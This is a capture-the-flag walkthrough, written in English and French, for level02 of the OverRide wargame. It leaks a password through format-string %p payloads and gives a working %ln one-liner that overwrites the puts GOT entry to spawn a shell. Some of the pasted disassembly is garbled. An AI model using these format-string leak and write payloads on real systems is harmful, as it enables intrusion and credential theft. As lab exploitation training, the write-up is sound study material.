# Walkthrough

## Solution
```
(python -c "print ('%4196972c%8\$ln') + '\n' + ('\xe0\x11\x60\x00\x00\x00\x00\x00')"; cat -) | ./level02
```  

## Explanation

### Execution

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: hello
--[ Password: test
*****************************************
hello does not have access!

```  
-> The program asks for a username and then a password


### Disassembly

You can view the commented asm code [here](resources/disassembly.asm)  
You can view the asm code translated to C [here](source.c)  


```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |\**************************************
/--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: 
*****************************************
0x7fffffffe4b0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6a8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x100207025 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

-> En imprimant la stack, on voit nos %p (25 70 20 en hexa), et au milieu, un 5 blocs de valeurs qui pourraient correspondre au password (5 * 8 bytes = 40 | buf2 size = 41).  

```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
```  

Les addresses sont en little endian, on doit donc les inverser:  
```
4868373452506e75 51397361354a4145 58674e5743717a37 7358476e68354a35 4d394b6650673348
```

  Convertir l'hexa en ascii:  -> cela nous donne `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |\**************************************/
--[ Username: test
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, test!
$ whoamilevel03
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```  

Le mot de passe était le flag...  


-----------------------------------------------  

```
$ (gdb) disas main
...
0x0000000000400a96 <+642>:    lea    rax,[rbp-0x70]		; buf1
0x0000000000400a9a <+646>:    mov    rdi,rax
0x0000000000400a9d <+649>:    mov    eax,
0x00x0000000000400aa2 <+654>:    call   0x4006c0 <printf@plt>	; printf(buf1)
0x0000000000400aa7 <+659>:    mov    edi,
0x400d3a0x0000000000400aac <+664>:    call   0x400680 <puts@plt>
0x0000000000400ab1 <+669>:    mov    edi,
0x10x0000000000400ab6 <+674>:    call   0x400710 <exit@plt>
```
-> The <printf> call at 0x0000000000400aa2 is vulnerable to string format attacks.  

It is calling puts afterwards. Let's try to change the puts address by the address of the "Greetings" below, so that it will launch a shell after that:  

```
   0x0000000000400a6c <+600>:	mov    $0x400d22,%eax			; "Greetings, %s!\n"
   0x0000000000400a71 <+605>:	lea    -0x70(%rbp),%rdx       ; buf1 in rax
   0x0000000000400a75 <+609>:	mov    %rdx,%rsi
   0x0000000000400a78 <+612>:	mov    %rax,%rdi
   0x0000000000400a7b <+615>:	mov    $0x0,%eax
   0x0000000000400a80 <+620>:	callq  0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>:	mov    $0x400d32,%edi         ; "/bin/sh"
   0x0000000000400a8a <+630>:	callq  0x4006b0 <system@plt>
```  

Finding which argument we can control on the stack:  
```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: BBBBBBBB
*****************************************
AAAAAAAA 0x7fffffffe4b0 (nil) 0x42 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6a8 0x1f7ff9a08 0x4242424242424242 (nil) (nil) (nil) (nil) does not have access!
```
-> It is the 8th argument  

```
$ objdump -R ./level02
...
00000000006011e0 R_X86_64_JUMP_SLOT  puts
...
```  

-> GOT address of puts : 00000000006011e0
-> Greetings address : 0x0000000000400a6c = 4196972  
```
(python -c "print ('%4196972c%8\$ln') + '\n' + ('\xe0\x11\x60\x00\x00\x00\x00\x00')"; cat -) | ./level02
```  
